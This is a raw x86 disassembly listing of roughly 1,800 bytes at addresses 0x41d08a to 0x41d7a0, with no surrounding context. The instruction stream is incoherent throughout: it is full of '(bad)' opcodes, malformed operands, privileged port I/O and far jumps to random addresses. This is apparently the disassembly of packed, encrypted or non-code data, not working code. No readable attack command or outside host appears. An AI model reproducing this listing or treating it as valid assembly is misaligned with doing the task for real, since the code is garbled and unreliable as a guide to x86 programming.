  41d08a:	xchg   edi,eax
  41d08b:	inc    ebx
  41d08c:	rcl    BYTE PTR [ecx],1
  41d08e:	or     bh,BYTE PTR [ecx+0x22]
  41d091:	pop    esp
  41d092:	bnd jmp 0x41d110
  41d095:	stc    
  41d096:	cmc    
  41d097:	sbb    ecx,DWORD PTR [eax+0x45]
  41d09a:	jnp    0x41d054
  41d09c:	jg     0x41d0a1
  41d09e:	xchg   bx,ax
  41d0a0:	dec    ebp
  41d0a1:	pop    ecx
  41d0a2:	or     BYTE PTR [edx+esi*4-0x2cf36360],ah
  41d0a9:	nop
  41d0aa:	mov    DWORD PTR [esi+0x5e],esi
  41d0ad:	mov    al,ds:0x8a54975
  41d0b2:	js     0x41d07a
  41d0b4:	imul   ebp,DWORD PTR [ecx+ecx*2],0x54eafe8b
  41d0bb:	js     0x41d100
  41d0bd:	cld    
  41d0be:	jmp    0xdd6b8b1f
  41d0c3:	pop    ds
  41d0c4:	(bad)  
  41d0c5:	pop    ebx
  41d0c6:	mov    ch,0x13
  41d0c8:	pop    ebp
  41d0c9:	or     ch,BYTE PTR fs:[ebx+0xd]
  41d0cd:	jg     0x41d0f1
  41d0cf:	and    ecx,DWORD PTR [edi]
  41d0d1:	mov    DWORD PTR [ecx-0x542cb396],ecx
  41d0d7:	icebp  
  41d0d8:	jo     0x41d0b9
  41d0da:	iret   
  41d0db:	scas   eax,DWORD PTR es:[edi]
  41d0dc:	sti    
  41d0dd:	mov    ah,bl
  41d0df:	dec    ecx
  41d0e0:	add    DWORD PTR [ecx-0x30187712],edi
  41d0e6:	add    bh,BYTE PTR [esi]
  41d0e8:	dec    edx
  41d0e9:	pop    ecx
  41d0ea:	sti    
  41d0eb:	or     ebx,ebp
  41d0ed:	mov    dl,0x45
  41d0ef:	dec    esp
  41d0f0:	xor    cl,0x4e
  41d0f3:	xchg   esi,eax
  41d0f4:	aaa    
  41d0f5:	loop   0x41d0fe
  41d0f7:	push   0x955dc1d3
  41d0fc:	lock js 0x41d0d7
  41d0ff:	cmp    eax,ecx
  41d101:	ins    DWORD PTR es:[edi],dx
  41d102:	push   edx
  41d103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d104:	lods   eax,DWORD PTR ds:[esi]
  41d105:	stos   BYTE PTR es:[edi],al
  41d106:	adc    al,0x64
  41d108:	add    al,0x67
  41d10a:	inc    edx
  41d10b:	fstp   TBYTE PTR [ecx+eax*4]
  41d10e:	mov    al,0x11
  41d110:	add    esi,DWORD PTR [edi]
  41d112:	sub    BYTE PTR [edx-0x3d],dl
  41d115:	out    0xb2,eax
  41d117:	stc    
  41d118:	(bad)  
  41d11a:	cs dec edi
  41d11c:	into   
  41d11d:	lods   al,BYTE PTR ds:[esi]
  41d11e:	js     0x41d163
  41d120:	add    dh,al
  41d122:	push   cs
  41d123:	jmp    0xfb89:0x93503a3c
  41d12a:	xchg   ebp,eax
  41d12b:	pop    ds
  41d12c:	push   cs
  41d12d:	ja     0x41d126
  41d12f:	inc    edi
  41d130:	fstp   QWORD PTR ds:0x5d9bd642
  41d136:	xor    esi,DWORD PTR [esi+0x2eab4c56]
  41d13c:	sahf   
  41d13d:	mov    cl,0x68
  41d13f:	loopne 0x41d110
  41d141:	stos   BYTE PTR es:[edi],al
  41d142:	mov    ebx,0x785da1f3
  41d147:	sahf   
  41d148:	mov    edi,0x90707dab
  41d14d:	stc    
  41d14e:	mov    ah,0xbf
  41d150:	imul   cl
  41d152:	shl    DWORD PTR ds:0x52903da1,0x8c
  41d159:	retf   0x3a33
  41d15c:	cmc    
  41d15d:	adc    al,0xeb
  41d15f:	or     al,0xf4
  41d161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d162:	mov    bh,0x54
  41d164:	lods   al,BYTE PTR ds:[esi]
  41d165:	mov    ebx,0x7d5a139
  41d16a:	xchg   edx,eax
  41d16b:	mov    ds:0x6b9448dd,eax
  41d170:	mov    cl,0xf
  41d173:	xchg   BYTE PTR [ecx+edi*8],cl
  41d176:	xor    eax,0x1821dcd3
  41d17b:	mov    ds:0xf5384393,al
  41d180:	loopne 0x41d1e3
  41d182:	test   al,0x8f
  41d184:	int    0xcc
  41d186:	jp     0x41d132
  41d188:	repz or ah,BYTE PTR [ebx+ebx*1+0x19c8e99b]
  41d190:	xor    esp,edx
  41d192:	fwait
  41d193:	inc    ebp
  41d194:	lods   al,BYTE PTR ds:[esi]
  41d195:	imul   eax,DWORD PTR [esi+0x75a34a4a],0xffffffc1
  41d19c:	and    ch,cl
  41d19e:	mov    ebx,edi
  41d1a0:	push   esp
  41d1a1:	pushf  
  41d1a2:	dec    DWORD PTR [eax]
  41d1a4:	mov    BYTE PTR [eax],bh
  41d1a6:	push   ebx
  41d1a7:	iret   
  41d1a8:	jge    0x41d203
  41d1aa:	sbb    edx,ebx
  41d1ac:	push   0x6b
  41d1ae:	pop    ss
  41d1af:	stos   DWORD PTR es:[edi],eax
  41d1b0:	(bad)  
  41d1b1:	in     al,dx
  41d1b2:	mov    al,0xcf
  41d1b4:	cmp    ebp,DWORD PTR [ecx]
  41d1b6:	cdq    
  41d1b7:	movaps xmm4,xmm7
  41d1ba:	in     al,dx
  41d1bb:	inc    esi
  41d1bc:	ror    BYTE PTR [ebx],1
  41d1be:	jg     0x41d1b7
  41d1c0:	push   ss
  41d1c1:	mov    ebp,cr7
  41d1c4:	dec    ebx
  41d1c5:	inc    edx
  41d1c6:	lods   eax,DWORD PTR ds:[esi]
  41d1c7:	ficom  WORD PTR [ebx*1+0x5f561459]
  41d1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1cf:	lods   eax,DWORD PTR ds:[esi]
  41d1d0:	jb     0x41d214
  41d1d2:	mov    edx,0xbba0bd2e
  41d1d7:	inc    esp
  41d1d8:	sbb    bl,dl
  41d1da:	loopne 0x41d1b7
  41d1dc:	cmp    al,ch
  41d1de:	fdiv   st(5),st
  41d1e0:	mov    esp,0x47da60c4
  41d1e5:	mov    dh,BYTE PTR [ecx+0x40]
  41d1e8:	jl     0x41d224
  41d1ea:	call   0x7e6c:0xaf9e0948
  41d1f1:	nop
  41d1f2:	sub    bh,BYTE PTR [edx+0x7d]
  41d1f5:	jmp    0xebd7:0x4b95751e
  41d1fc:	pushf  
  41d1fd:	out    0x45,al
  41d1ff:	lods   eax,DWORD PTR ds:[esi]
  41d200:	or     ch,BYTE PTR [esi]
  41d202:	jl     0x41d1d1
  41d204:	in     eax,0xa9
  41d206:	cmp    al,0xbc
  41d208:	or     al,0x5f
  41d20a:	fwait
  41d20b:	(bad)  
  41d20c:	jl     0x41d21a
  41d20e:	sbb    DWORD PTR [edx+eax*4],edi
  41d211:	xor    BYTE PTR [edx+0x15],dh
  41d214:	js     0x41d252
  41d216:	fisub  DWORD PTR [ebp-0x6f4a06fe]
  41d21c:	je     0x41d200
  41d21e:	cdq    
  41d21f:	shr    BYTE PTR [esi-0x4f0ed81e],1
  41d225:	popf   
  41d226:	mov    eax,0x30ed9e27
  41d22b:	sbb    ebp,DWORD PTR [edx-0x12]
  41d22e:	add    eax,0xc3ef3f93
  41d233:	ins    DWORD PTR es:[edi],dx
  41d234:	jne    0x41d277
  41d236:	mov    al,ds:0xe11fd829
  41d23b:	or     al,0x74
  41d23d:	adc    BYTE PTR [eax-0x489f09aa],bh
  41d243:	fwait
  41d244:	cmp    DWORD PTR [ebx],esi
  41d246:	inc    eax
  41d247:	sbb    eax,0x3c0e70a8
  41d24c:	js     0x41d282
  41d24e:	(bad)  
  41d24f:	std    
  41d250:	fsubr  st(1),st
  41d252:	push   ebx
  41d253:	iret   
  41d254:	stos   BYTE PTR es:[edi],al
  41d255:	pop    es
  41d256:	faddp  st(0),st
  41d258:	call   0xa603:0x41a277a6
  41d25f:	push   ss
  41d260:	sbb    esp,esi
  41d262:	sub    dl,al
  41d264:	shl    DWORD PTR [eax-0x51a52c93],0x3b
  41d26b:	aam    0x2a
  41d26d:	loope  0x41d1f2
  41d26f:	cli    
  41d270:	xchg   ecx,eax
  41d271:	jl     0x41d237
  41d273:	pop    ecx
  41d274:	adc    DWORD PTR [ecx-0x3fa2331a],ecx
  41d27a:	pop    edx
  41d27b:	bound  esp,QWORD PTR ds:[edi-0x4a98d362]
  41d282:	lds    ebp,FWORD PTR [eax+0x3]
  41d285:	fidivr DWORD PTR [edx]
  41d287:	aad    0x45
  41d289:	loop   0x41d2d5
  41d28b:	dec    ebx
  41d28c:	mov    edi,0xd5a3756b
  41d291:	dec    edi
  41d292:	and    eax,0x2a505a9f
  41d297:	sub    al,0x1a
  41d299:	inc    esi
  41d29a:	neg    DWORD PTR [esi]
  41d29c:	cli    
  41d29d:	lods   al,BYTE PTR ds:[esi]
  41d29e:	es push edi
  41d2a0:	jmp    0xf256:0x85a6b8f7
  41d2a7:	cmp    ch,BYTE PTR [ecx+esi*1]
  41d2aa:	cli    
  41d2ab:	scas   eax,DWORD PTR es:[edi]
  41d2ac:	scas   al,BYTE PTR es:[edi]
  41d2ad:	inc    ebx
  41d2ae:	dec    eax
  41d2af:	jne    0x41d231
  41d2b1:	in     eax,0x4d
  41d2b3:	dec    esp
  41d2b4:	sub    bl,ch
  41d2b6:	mov    gs,WORD PTR [eax-0x2f]
  41d2b9:	shl    DWORD PTR [edx],0x2c
  41d2bc:	mov    ebx,0x7f46d9ae
  41d2c1:	mov    ah,0x3
  41d2c3:	push   ds
  41d2c4:	mov    bl,0x9d
  41d2c6:	add    dh,BYTE PTR [ebx-0x1000f07d]
  41d2cc:	test   eax,0xec2e7e16
  41d2d1:	dec    edi
  41d2d2:	jge    0x41d34c
  41d2d4:	mov    es,WORD PTR [ebp+0x5d9d8a7a]
  41d2da:	sbb    al,0xb2
  41d2dc:	popa   
  41d2dd:	in     eax,0xcb
  41d2df:	ins    DWORD PTR es:[edi],dx
  41d2e0:	rcr    bh,1
  41d2e2:	add    BYTE PTR [edi+eiz*4-0x5b],ah
  41d2e6:	push   ds
  41d2e7:	jg     0x41d292
  41d2e9:	rcl    cl,0x62
  41d2ec:	popf   
  41d2ed:	and    dh,ch
  41d2ef:	(bad)  
  41d2f0:	jp     0x41d27c
  41d2f2:	inc    ecx
  41d2f3:	out    0x12,eax
  41d2f5:	int    0x46
  41d2f7:	adc    DWORD PTR [esp+ebx*4],edi
  41d2fa:	sbb    ecx,DWORD PTR [esi-0x1b9e7509]
  41d300:	nop
  41d301:	enter  0xd63b,0x30
  41d305:	inc    eax
  41d306:	and    DWORD PTR [eax+ecx*8+0x32],esp
  41d30a:	sbb    BYTE PTR es:[esi],dl
  41d30d:	imul   BYTE PTR [ecx-0xfe33106]
  41d313:	add    esi,DWORD PTR [edi]
  41d315:	popa   
  41d316:	xchg   esi,eax
  41d317:	xlat   BYTE PTR ds:[ebx]
  41d318:	or     DWORD PTR [edx],ecx
  41d31a:	xchg   esi,eax
  41d31b:	jle    0x41d2e2
  41d31d:	mov    dl,bh
  41d31f:	xchg   DWORD PTR [eax+esi*4-0x9],edi
  41d323:	scas   eax,DWORD PTR es:[edi]
  41d324:	mov    DWORD PTR [ebp+0x4e45191e],edi
  41d32a:	sub    BYTE PTR [edx+0x1b5c7eb0],ch
  41d330:	mov    ?,WORD PTR [ebx+0x72]
  41d333:	scas   eax,DWORD PTR es:[edi]
  41d334:	adc    al,0x9b
  41d336:	lds    eax,FWORD PTR [edx+0x49625279]
  41d33c:	jge    0x41d310
  41d33e:	bound  esp,QWORD PTR [edi]
  41d340:	cdq    
  41d341:	les    ecx,FWORD PTR [ebx+ebx*4]
  41d344:	and    ebx,ebp
  41d346:	and    BYTE PTR [ecx-0x8],bl
  41d349:	cdq    
  41d34a:	push   ecx
  41d34b:	sub    dl,BYTE PTR [edx-0x3b]
  41d34e:	adc    DWORD PTR [eax+0x30],edx
  41d351:	fsubr  QWORD PTR [eax]
  41d353:	sar    DWORD PTR [edi],cl
  41d355:	enter  0xf181,0xc0
  41d359:	or     DWORD PTR [ebp+0x68],ebx
  41d35c:	mov    gs,WORD PTR [edi+edi*8-0x68]
  41d360:	and    ah,BYTE PTR [esp+ebx*1+0x49567bb7]
  41d367:	mov    cl,0xc7
  41d369:	test   ecx,esp
  41d36b:	cdq    
  41d36c:	dec    esi
  41d36d:	mov    edx,0x72d56978
  41d372:	(bad)  [esp-0x7836ee24]
  41d379:	add    eax,0xc2e7a0af
  41d37f:	test   esp,ebp
  41d381:	push   0xcbd3fbd
  41d386:	sbb    bh,0x8c
  41d389:	inc    ebp
  41d38a:	mov    al,ds:0x12d7d5f1
  41d38f:	mov    eax,0xb5b59be7
  41d394:	mov    al,ds:0x41976198
  41d399:	pop    eax
  41d39a:	ss pop ebx
  41d39c:	or     al,0x99
  41d39e:	mov    ah,0xd9
  41d3a0:	pop    edx
  41d3a1:	test   BYTE PTR [eax+edx*1+0x2e],ch
  41d3a5:	pop    edi
  41d3a6:	xor    DWORD PTR [esi],esi
  41d3a8:	jecxz  0x41d3b2
  41d3aa:	das    
  41d3ab:	xchg   esp,eax
  41d3ac:	std    
  41d3ad:	jp     0x41d416
  41d3af:	out    0x60,eax
  41d3b1:	add    eax,0xfe4895e0
  41d3b6:	es gs add bl,ah
  41d3ba:	or     al,0x31
  41d3bc:	enter  0x3487,0xd9
  41d3c0:	mov    bl,0x68
  41d3c2:	sub    BYTE PTR [ebp-0x68],al
  41d3c5:	inc    edx
  41d3c6:	lahf   
  41d3c7:	das    
  41d3c8:	add    al,0x16
  41d3ca:	cld    
  41d3cb:	in     al,0x71
  41d3cd:	addr16 dec ebx
  41d3cf:	std    
  41d3d0:	xchg   edi,eax
  41d3d1:	fmul   DWORD PTR [eax+edx*4-0x468d4164]
  41d3d8:	(bad)  
  41d3d9:	xchg   esi,eax
  41d3da:	xlat   BYTE PTR ds:[ebx]
  41d3db:	or     DWORD PTR [edx],ebp
  41d3dd:	repnz mov es,ecx
  41d3e0:	push   cs
  41d3e1:	retf   0x4e05
  41d3e4:	jp     0x41d3c9
  41d3e6:	cwde   
  41d3e7:	fs loope 0x41d42a
  41d3ea:	mov    bl,0x14
  41d3ec:	out    0x45,eax
  41d3ee:	in     al,dx
  41d3ef:	pop    ecx
  41d3f0:	sbb    edi,DWORD PTR [esp+esi*8+0x18ee12b0]
  41d3f7:	stos   DWORD PTR es:[edi],eax
  41d3f8:	fisubr WORD PTR [ebx+0xb]
  41d3fb:	idiv   DWORD PTR [edi+0x69b712a3]
  41d401:	pop    edx
  41d402:	in     al,dx
  41d403:	adc    dl,BYTE PTR [ebx+eiz*2-0x5d]
  41d407:	and    BYTE PTR [edi],ah
  41d409:	retf   
  41d40a:	or     bh,BYTE PTR [esp+ebp*8-0x73]
  41d40e:	adc    ah,BYTE PTR [eax-0x3eee6071]
  41d414:	ficom  WORD PTR [esi-0x56ed526d]
  41d41a:	and    DWORD PTR es:[ebp+eiz*4-0x6ea57c32],0xb4832a1a
  41d426:	push   ebp
  41d427:	scas   eax,DWORD PTR es:[edi]
  41d428:	push   ss
  41d429:	(bad)  
  41d42b:	mov    bh,0xf3
  41d42d:	imul   edx,DWORD PTR [eax-0x5442928f],0x604fe5cf
  41d437:	and    al,0xbb
  41d439:	adc    esi,DWORD PTR [eax]
  41d43b:	add    esp,DWORD PTR [ecx+ebp*4+0x5b91d6f5]
  41d442:	popf   
  41d443:	or     eax,0x945319cc
  41d448:	mov    ?,WORD PTR [ebp-0x13e557f0]
  41d44e:	bound  edi,QWORD PTR [edi]
  41d450:	scas   eax,DWORD PTR es:[edi]
  41d451:	jle    0x41d3f7
  41d453:	loopne 0x41d426
  41d455:	out    0x43,eax
  41d457:	shl    DWORD PTR [edi],cl
  41d459:	dec    ecx
  41d45a:	sahf   
  41d45b:	scas   al,BYTE PTR es:[edi]
  41d45c:	jl     0x41d3f4
  41d45e:	ja     0x41d466
  41d460:	xor    dh,BYTE PTR [esi]
  41d462:	(bad)  
  41d463:	test   edx,ecx
  41d465:	dec    ebp
  41d466:	add    BYTE PTR [eax],bh
  41d468:	dec    edi
  41d469:	jecxz  0x41d414
  41d46b:	pop    es
  41d46c:	popa   
  41d46d:	and    DWORD PTR [ecx-0x27],ecx
  41d470:	mov    esp,0xd14a498b
  41d475:	inc    edx
  41d476:	adc    esp,ebx
  41d478:	xchg   ebp,eax
  41d479:	xchg   ebp,eax
  41d47a:	sub    al,0x1b
  41d47c:	sahf   
  41d47d:	jmp    0x41d46b
  41d47f:	loope  0x41d4b0
  41d481:	dec    ebx
  41d482:	add    al,0x2f
  41d484:	std    
  41d485:	push   ss
  41d486:	sub    edx,DWORD PTR [esi]
  41d488:	jno    0x41d42a
  41d48a:	arpl   WORD PTR [ebx+0xc],bx
  41d48d:	int    0x95
  41d48f:	sub    al,0x2a
  41d491:	xor    eax,eax
  41d493:	adc    ebx,DWORD PTR [esi]
  41d495:	xchg   DWORD PTR [eax],ebx
  41d497:	lods   al,BYTE PTR ds:[esi]
  41d498:	fisttp DWORD PTR [ecx+ebx*2-0x3a]
  41d49c:	int3   
  41d49d:	jae    0x41d476
  41d49f:	ja     0x41d49f
  41d4a1:	repnz cmp ebx,DWORD PTR [eax+0x5ec75910]
  41d4a8:	jl     0x41d529
  41d4aa:	(bad)  
  41d4ab:	mov    esp,0xfe837ad6
  41d4b0:	mov    cl,0x5c
  41d4b2:	gs add eax,0xd532ccbf
  41d4b8:	adc    al,0xd2
  41d4ba:	aad    0x92
  41d4bc:	mov    dh,0xbc
  41d4be:	xor    al,BYTE PTR [eax-0x2de24aff]
  41d4c4:	stos   BYTE PTR es:[edi],al
  41d4c5:	out    dx,eax
  41d4c6:	adc    al,0xc8
  41d4c8:	aad    0x6d
  41d4ca:	xchg   esi,eax
  41d4cb:	xchg   esi,eax
  41d4cc:	outs   dx,DWORD PTR ds:[esi]
  41d4cd:	fstp   TBYTE PTR [edx]
  41d4cf:	pop    ebp
  41d4d0:	call   0x7441:0x93c8e2aa
  41d4d7:	loopne 0x41d524
  41d4d9:	icebp  
  41d4da:	shl    BYTE PTR [edx+0x6df7705d],0x56
  41d4e1:	add    al,0xd6
  41d4e3:	cld    
  41d4e4:	pusha  
  41d4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e6:	add    BYTE PTR [ecx-0x1734cec4],ch
  41d4ec:	fs dec edi
  41d4ee:	mov    dl,0x4a
  41d4f0:	mov    al,ds:0xb6ac5ad3
  41d4f5:	inc    ebx
  41d4f6:	push   ecx
  41d4f7:	xor    al,0x26
  41d4f9:	ret    0x4532
  41d4fc:	int    0x28
  41d4fe:	inc    ecx
  41d4ff:	xchg   ecx,eax
  41d500:	adc    dh,BYTE PTR [esi+eax*8-0x27]
  41d504:	mov    DWORD PTR [edx-0x74],edx
  41d507:	mov    ds:0xfec1aa1c,al
  41d50c:	xchg   BYTE PTR [esi-0x70],bl
  41d50f:	sti    
  41d510:	inc    ebp
  41d511:	lds    edi,FWORD PTR [ebp+0x58]
  41d514:	aad    0xd6
  41d516:	ja     0x41d534
  41d518:	aas    
  41d519:	inc    edi
  41d51a:	dec    edi
  41d51b:	add    eax,ecx
  41d51d:	arpl   WORD PTR [ebx],si
  41d51f:	adc    cl,BYTE PTR [ecx-0x470c4667]
  41d525:	adc    edi,DWORD PTR [ebp+0x32]
  41d528:	jge    0x41d4e1
  41d52a:	mov    ebp,0xa899d96f
  41d52f:	mov    edx,esp
  41d531:	pop    ss
  41d532:	adc    eax,0xdd6bb74f
  41d537:	test   edi,ebp
  41d539:	jns    0x41d53e
  41d53b:	xchg   DWORD PTR ds:0x6459664e,esp
  41d541:	jno    0x41d585
  41d543:	into   
  41d544:	repz hlt 
  41d546:	jg     0x41d4e0
  41d548:	(bad)  
  41d549:	push   ebp
  41d54a:	es int3 
  41d54c:	pop    esp
  41d54d:	adc    dh,0x5c
  41d550:	dec    esi
  41d551:	xchg   ebx,eax
  41d552:	mov    al,0x80
  41d554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d555:	xchg   edi,eax
  41d556:	pop    esi
  41d557:	js     0x41d511
  41d559:	add    ecx,ebp
  41d55b:	mov    al,ds:0x9b1e1767
  41d560:	dec    ebp
  41d561:	xor    ecx,edi
  41d563:	test   al,0xe6
  41d565:	dec    ebx
  41d566:	jo     0x41d55e
  41d568:	aam    0x8
  41d56a:	in     eax,dx
  41d56b:	pop    es
  41d56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d56d:	out    0x7f,al
  41d56f:	pop    ss
  41d570:	pop    esi
  41d571:	jbe    0x41d52f
  41d573:	ins    BYTE PTR es:[edi],dx
  41d574:	enter  0x4526,0x4d
  41d578:	mov    edx,0x2eb973de
  41d57d:	add    eax,0xfa8677b5
  41d582:	out    dx,al
  41d583:	xchg   edx,eax
  41d584:	cmp    eax,0xb5fb753e
  41d589:	clc    
  41d58a:	xchg   esi,eax
  41d58b:	xor    ch,dl
  41d58d:	ins    DWORD PTR es:[edi],dx
  41d58e:	or     BYTE PTR [esi+edi*2],bl
  41d591:	cmc    
  41d592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d593:	stos   DWORD PTR es:[edi],eax
  41d594:	(bad)  
  41d595:	leave  
  41d596:	xor    al,0xa1
  41d598:	sbb    BYTE PTR [ecx+0x5e],0x79
  41d59c:	dec    eax
  41d59d:	mov    bh,0x36
  41d59f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a0:	adc    al,0x2d
  41d5a2:	clc    
  41d5a3:	dec    eax
  41d5a4:	hlt    
  41d5a5:	sub    BYTE PTR [ecx+0x7f229221],0xac
  41d5ac:	mov    al,ds:0xc8ad2d1b
  41d5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b2:	jns    0x9e78b9dd
  41d5b8:	inc    edx
  41d5b9:	mov    ebx,0xda566af6
  41d5be:	jb     0x41d5c4
  41d5c0:	jne    0x41d5c8
  41d5c2:	mov    eax,0xaad9aa0c
  41d5c7:	sbb    al,0x68
  41d5c9:	idiv   BYTE PTR [eax-0x80]
  41d5cc:	stc    
  41d5cd:	cmp    cl,dl
  41d5cf:	ret    0x1082
  41d5d2:	jns    0x41d561
  41d5d4:	pop    edi
  41d5d5:	xor    eax,0x693dc8e7
  41d5da:	mov    ebx,0x68722478
  41d5df:	cld    
  41d5e0:	xlat   BYTE PTR ds:[ebx]
  41d5e1:	fistp  WORD PTR [ecx+0x61]
  41d5e4:	pushf  
  41d5e5:	sbb    eax,0x333223b6
  41d5ea:	push   es
  41d5eb:	push   cs
  41d5ec:	dec    ebp
  41d5ed:	outs   dx,DWORD PTR ds:[esi]
  41d5ee:	cld    
  41d5ef:	mov    dl,0xc2
  41d5f1:	or     DWORD PTR [edx-0x33daf3fc],esi
  41d5f7:	dec    ebx
  41d5f8:	in     al,0xb2
  41d5fa:	bound  eax,QWORD PTR [eax+0x26]
  41d5fd:	and    eax,edi
  41d5ff:	test   DWORD PTR [eax+0x37],ecx
  41d602:	call   0x3a74a71f
  41d607:	nop
  41d608:	imul   esp,esp,0xffffffd6
  41d60b:	add    ch,0x87
  41d60e:	ret    0xf48f
  41d611:	pop    edi
  41d612:	pop    es
  41d613:	xchg   esp,eax
  41d614:	add    al,0x1
  41d616:	scas   al,BYTE PTR es:[edi]
  41d617:	imul   edx,DWORD PTR [esi],0x93faba9f
  41d61d:	or     DWORD PTR [esp+esi*4],esp
  41d620:	pop    ds
  41d621:	push   ss
  41d622:	mov    edx,0xbede871a
  41d627:	fsubr  QWORD PTR [edi]
  41d629:	leave  
  41d62a:	ja     0x41d623
  41d62c:	dec    ebp
  41d62d:	mov    cl,0x12
  41d62f:	sub    DWORD PTR [ebx+0x15],ecx
  41d632:	mov    eax,0x78894abc
  41d637:	and    esi,DWORD PTR [ebx-0x58]
  41d63a:	pop    ecx
  41d63b:	pop    ebx
  41d63c:	mov    eax,0x54adf6ed
  41d641:	mov    esi,0xdce97730
  41d646:	mov    esp,0x9a9ea844
  41d64b:	dec    ebx
  41d64c:	inc    esp
  41d64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d64e:	and    eax,0xefbe3b3d
  41d653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d654:	jmp    FWORD PTR [ecx-0x57315bea]
  41d65a:	cmp    dl,BYTE PTR [esi]
  41d65c:	add    bh,BYTE PTR [edi+0x17]
  41d65f:	add    al,0x56
  41d661:	dec    ebp
  41d662:	adc    ebx,DWORD PTR [edi-0x6c2b49d3]
  41d668:	mov    dh,0x0
  41d66a:	popf   
  41d66b:	gs xor bh,dl
  41d66e:	pop    es
  41d66f:	nop    DWORD PTR [edx+edx*2-0x41]
  41d674:	outs   dx,BYTE PTR ds:[esi]
  41d675:	pop    eax
  41d676:	xor    eax,0xcb823ba1
  41d67b:	out    dx,eax
  41d67c:	sub    al,0xae
  41d67e:	sbb    dh,BYTE PTR [ecx-0x30]
  41d681:	es push esi
  41d683:	clc    
  41d684:	cmp    BYTE PTR [edx-0x5e],dl
  41d687:	or     BYTE PTR [eax-0x2fc8864],cl
  41d68d:	pop    ebp
  41d68e:	(bad)  
  41d68f:	sar    BYTE PTR [ebx-0x1a5511e1],1
  41d695:	scas   al,BYTE PTR es:[edi]
  41d696:	add    BYTE PTR [edi-0x24711e5d],cl
  41d69c:	(bad)  
  41d69d:	push   esp
  41d69e:	pop    eax
  41d69f:	inc    ecx
  41d6a0:	popf   
  41d6a1:	sub    al,0x6
  41d6a3:	pop    esp
  41d6a4:	cmp    BYTE PTR [ebx+0x10],dl
  41d6a7:	out    0xbc,al
  41d6a9:	sub    BYTE PTR [eax-0x85af513],bl
  41d6af:	push   0xffffff88
  41d6b1:	dec    ecx
  41d6b2:	sahf   
  41d6b3:	inc    ecx
  41d6b4:	rcr    DWORD PTR [eax+0x52eca918],0xba
  41d6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6bc:	and    bl,bh
  41d6be:	push   ebx
  41d6bf:	sbb    DWORD PTR [edx-0x5ceebc3e],0xffffffe1
  41d6c6:	push   ecx
  41d6c7:	cld    
  41d6c8:	xor    BYTE PTR [edi],ch
  41d6ca:	stos   DWORD PTR es:[edi],eax
  41d6cb:	outs   dx,BYTE PTR ds:[esi]
  41d6cc:	push   cs
  41d6cd:	jne    0x41d659
  41d6cf:	js     0x41d734
  41d6d1:	and    eax,0x5067e430
  41d6d6:	(bad)  
  41d6d7:	in     eax,0x35
  41d6d9:	dec    esi
  41d6da:	data16 adc al,0xda
  41d6dd:	sbb    BYTE PTR ds:0x26fd9262,bh
  41d6e3:	arpl   WORD PTR [edi-0x2f],dx
  41d6e6:	push   0x15
  41d6e8:	popf   
  41d6e9:	loop   0x41d729
  41d6eb:	cmp    eax,0xfd85c18f
  41d6f0:	dec    esp
  41d6f1:	rol    BYTE PTR [ebp+0x5714efe7],1
  41d6f7:	cmp    bl,BYTE PTR ds:0x4bb46ea6
  41d6fd:	jmp    0x41d6e6
  41d6ff:	xchg   ebp,eax
  41d700:	push   ebx
  41d701:	ret    
  41d702:	sub    BYTE PTR [eax-0x278edd90],al
  41d708:	push   0x5ed29a17
  41d70d:	dec    edi
  41d70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d70f:	or     edx,DWORD PTR [edx-0x1f]
  41d712:	das    
  41d713:	ret    
  41d714:	push   esi
  41d715:	cmp    ah,BYTE PTR [ebx]
  41d717:	jno    0x41d76a
  41d719:	popa   
  41d71a:	xchg   ecx,eax
  41d71b:	fadd   st(4),st
  41d71d:	aad    0xed
  41d71f:	mul    DWORD PTR [edi]
  41d721:	pop    eax
  41d722:	rol    DWORD PTR [ebp+0x7bd8266b],1
  41d728:	ins    DWORD PTR es:[edi],dx
  41d729:	adc    BYTE PTR [edi],dl
  41d72b:	ins    BYTE PTR es:[edi],dx
  41d72c:	rol    BYTE PTR [edi+0x5],0x93
  41d730:	sti    
  41d731:	jmp    0xd71d4f24
  41d736:	in     al,dx
  41d737:	cmp    bl,BYTE PTR [eax+0x1d]
  41d73a:	fcom   DWORD PTR [eax-0x36]
  41d73d:	xchg   bl,al
  41d73f:	add    eax,0x4adeebb
  41d744:	add    bh,BYTE PTR [edx-0x5ace0bbf]
  41d74a:	inc    esp
  41d74b:	inc    ebp
  41d74c:	sti    
  41d74d:	or     dh,BYTE PTR ds:0xa3911b03
  41d753:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41d755:	es daa 
  41d757:	inc    edi
  41d758:	push   ebp
  41d759:	pop    ebp
  41d75a:	outs   dx,BYTE PTR ds:[esi]
  41d75b:	and    eax,0xab2400f1
  41d760:	(bad)  
  41d761:	pushf  
  41d762:	test   DWORD PTR [ecx-0x54],edx
  41d765:	ds pop ds
  41d767:	sbb    BYTE PTR [eax-0x19],dh
  41d76a:	outs   dx,BYTE PTR ds:[esi]
  41d76b:	add    BYTE PTR [esi+esi*1],ah
  41d76e:	dec    esp
  41d76f:	adc    DWORD PTR gs:[edi-0x30],ebp
  41d773:	repz sbb ebx,DWORD PTR [edx-0x41]
  41d777:	sbb    DWORD PTR [esi+0x28],0x1b367e44
  41d77e:	(bad)  
  41d77f:	cli    
  41d780:	(bad)  
  41d781:	adc    DWORD PTR [ecx-0x4f679ec],ebx
  41d787:	pop    esi
  41d788:	xor    edi,ecx
  41d78a:	call   0xbcf2eae6
  41d78f:	fcomp  QWORD PTR [ecx-0x4d5f63a1]
  41d795:	add    BYTE PTR [eax+0x22aa5cbf],bh
  41d79b:	cmp    dl,dl
  41d79d:	push   ebp
  41d79e:	inc    ebp
  41d79f:	inc    ebp
  41d7a0:	add    BYTE PTR [esi-0x3dabb968],al
